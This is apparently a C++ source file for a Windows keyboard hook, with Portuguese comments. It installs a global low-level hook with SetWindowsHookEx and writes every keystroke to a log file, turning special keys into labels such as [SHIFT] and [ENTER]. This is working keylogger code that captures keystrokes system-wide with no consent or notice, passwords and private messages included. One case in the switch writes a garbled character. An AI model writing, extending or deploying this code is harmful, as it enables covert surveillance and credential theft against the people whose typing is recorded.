#include "KeyboardHook.h"

std::string logFile;

HHOOK _hook;

KBDLLHOOKSTRUCT kbdStruct;

std::mutex mtx;

void SetHook(std::string file){

	logFile = file;

	_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0);

}

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {

	// ALT GR e ALT devolvem wParam == 260 em vez de 256 (WM_KEYDOWN)

	mtx.lock();

	if (nCode >= 0){

		if (wParam == WM_KEYDOWN) {

			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

            WriteKey(kbdStruct.vkCode);

        }

	}

	mtx.unlock();
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void WriteKey(int key) {

	std::ofstream file;
	file.open(logFile, std::ofstream::app);

	switch (key) {
	case 160:
		file << "[SHIFT]";
		break;
	case VK_CAPITAL:
		file << "[CAPS]";
		break;
	case VK_MENU:
		file << "[ALT]";
		break;
	case VK_BACK:
		file << "[BACKSPACE]";
		break;
	case VK_TAB:
		file << "[TAB]";
		break;
	case VK_RETURN:
		file << "[ENTER]";
		break;
	case VK_SPACE:
		file << "[SPACE]";
		break;
	case 130:
		file << "�";
		break;
	case VK_DELETE:
		file << "[DELETE]";
		break;
	case 190:
		file << "[. or :]";
		break;
	case 188:
		file << "[, or ;]";
		break;
	case 187:
		file << "[+ or *]";
		break;
	case 191:
		file << "[~ or ^]";
		break;
	case 189:
		file << "[- or _]";
		break;
	case 164:
		break;
	default:
		file << (char)key;
	}
	file.flush();
	file.close();
}